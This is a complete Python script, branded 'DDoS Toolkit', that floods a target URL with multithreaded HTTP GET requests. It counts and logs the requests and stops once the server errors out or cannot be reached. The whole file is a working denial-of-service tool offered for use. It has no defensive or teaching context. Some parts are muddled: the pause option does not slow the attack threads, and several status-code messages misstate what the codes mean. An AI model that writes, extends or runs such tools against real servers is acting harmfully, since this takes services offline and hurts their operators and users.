import requests
import time
import sys
import argparse
import threading
import logging
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Colors for different messages
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
RESET = Style.RESET_ALL

# Global variable to count requests sent
requests_sent = 0
requests_lock = threading.Lock()  # Lock for thread-safe requests counting

# Function to display the banner with colors
def display_banner():
    print(f"""
    {BLUE}##################################################
    {BLUE}#                                                #
    {BLUE}#                DDoS Toolkit                    #
    {BLUE}#        Simple HTTP Flood DDoS Attack           #
    {BLUE}#                                                #
    {YELLOW}#            Created BY MIDO                   #
    {YELLOW}#                                              #
    {BLUE}#                                                #
    {BLUE}##################################################
    """)

# Function to send requests to the target URL
def attack(target_url, stop_event, logger):
    global requests_sent
    while not stop_event.is_set():
        try:
            # Send a GET request with a timeout
            response = requests.get(target_url, timeout=3)
            
            # Check if server is reachable
            if response.status_code >= 500:
                logger.error(f"Server error: {response.status_code}. Target may be down or overloaded.")
                print(f"{RED}Server error: {response.status_code}. Target may be down or overloaded.")
                stop_event.set()
                break
            elif response.status_code == 404:
                logger.error(f"Server responded with 404: Not Found. The server may be unreachable.")
                print(f"{RED}Server responded with 404: Not Found. The server may be unreachable.")
                stop_event.set()
                break
            elif response.status_code == 403:
                logger.error(f"Server responded with 403: Forbidden. The server has blocked the attack.")
                print(f"{RED}Server responded with 403: Forbidden. The server has blocked the attack.")
                stop_event.set()
                break

            # Log each successful request
            with requests_lock:
                requests_sent += 1
            logger.info(f"Request {requests_sent} sent successfully.")
            
        except requests.RequestException as e:
            logger.error(f"Error: Unable to reach the server. Details: {e}")
            print(f"{RED}Error: Unable to reach the server. Details: {e}")
            stop_event.set()
            print(f"{YELLOW}The server appears to be down or unreachable!")
            break

# Function to display the status of the attack with a colored output
def display_status(stop_event, logger):
    global requests_sent
    while not stop_event.is_set():
        with requests_lock:
            print(f"{GREEN}Requests Sent: {requests_sent}", end="\r", flush=True)
        logger.info(f"Requests Sent: {requests_sent}")
        time.sleep(1)

# Function to parse command-line arguments
def parse_args():
    parser = argparse.ArgumentParser(description="Simple DDoS attack script")
    parser.add_argument("-u", "--url", type=str, required=True, help="Target URL for the attack (e.g., http://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads to use (default: 10)")
    parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests (in seconds, default: 0.1)")
    parser.add_argument("-l", "--logfile", type=str, default="attack_log.txt", help="Log file to write logs (default: 'attack_log.txt')")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable detailed logging")
    args = parser.parse_args()
    return args.url, args.threads, args.pause, args.logfile, args.verbose

# Function to set up logging configuration
def setup_logging(logfile, verbose):
    log_level = logging.DEBUG if verbose else logging.INFO
    logging.basicConfig(
        level=log_level,
        format="%(asctime)s - %(levelname)s - %(message)s",
        handlers=[
            logging.FileHandler(logfile),
            logging.StreamHandler(sys.stdout)  # Print logs to console as well
        ]
    )
    logger = logging.getLogger()
    return logger

# Main function to run the DDoS attack
def main():
    global requests_sent
    
    # Parse arguments
    target_url, num_threads, pause_time, logfile, verbose = parse_args()

    if not target_url.startswith(('http://', 'https://')):
        print(f"{RED}Error: Invalid URL. URL must start with 'http://' or 'https://'.")
        sys.exit(1)

    # Set up logging
    logger = setup_logging(logfile, verbose)

    # Display the banner
    display_banner()
    
    logger.info(f"Starting DDoS attack on {target_url} with {num_threads} threads...")

    # Create a stop event to stop all threads gracefully
    stop_event = threading.Event()

    # Start the display status thread
    status_thread = threading.Thread(target=display_status, args=(stop_event, logger))
    status_thread.daemon = True
    status_thread.start()

    # Start attack threads
    attack_threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack, args=(target_url, stop_event, logger))
        t.daemon = True
        attack_threads.append(t)
        t.start()

    # Wait for the user to stop the attack
    try:
        while True:
            time.sleep(pause_time)
    except KeyboardInterrupt:
        logger.warning(f"Attack interrupted by user.")
        print(f"\n{RED}Attack interrupted by user.")
        stop_event.set()

    # Wait for all attack threads to finish
    for t in attack_threads:
        t.join()

    # Print final results and log them
    logger.info(f"Attack finished. Total requests sent: {requests_sent}")
    print(f"{GREEN}Attack finished. Total requests sent: {requests_sent}")

if __name__ == "__main__":
    main()
